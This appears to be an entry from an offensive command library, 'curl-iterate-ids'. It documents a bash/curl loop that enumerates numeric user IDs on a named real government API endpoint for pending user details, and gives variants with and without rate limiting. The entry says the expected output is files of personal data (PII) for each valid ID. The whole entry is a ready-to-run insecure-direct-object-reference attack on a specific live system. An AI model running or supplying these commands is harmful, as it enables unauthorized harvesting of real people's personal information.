---
data: >-
  for id in {2620..2640}; do response=$(curl -s -X GET
  "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/$id"); if
  [[ $response != *\"not found\"* ]]; then echo "$id: Valid" > user_$id.json;
  echo $response >> user_$id.json; fi; done
tags:
  - enumeration
  - loop
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.362Z'
id: 42051dab-5bf6-4554-bba2-b61fe7cd57f1
verified: false
validated: true
submitted: true
---
# curl-iterate-ids

## Command

```bash
for id in {2620..2640}; do response=$(curl -s -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/$id"); if [[ $response != *\"not found\"* ]]; then echo "$id: Valid" > user_$id.json; echo $response >> user_$id.json; fi; done
```

## Description

Bash loop using curl to iterate over numeric IDs, querying the TAMS endpoint and saving valid responses to files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for id in {2620..2640}` | Range of IDs to test | Yes |
| `curl -s -X GET` | Silent GET request to endpoint with $id | Yes |
| `if [[ $response != *\"not found\"* ]]` | Condition to check for valid response | Yes |

## Examples

### Basic Usage

```bash
for id in 2629 2628 2627; do curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/$id" -o user_$id.json; done
```

### With Rate Limiting

```bash
for id in {2620..2640}; do curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/$id" -o user_$id.json; sleep 1; done
```

## Expected Output

Files like user_2629.json with JSON PII for valid IDs; console echoes "ID X: Valid" for hits.

## Related

- [[Related Procedure]]
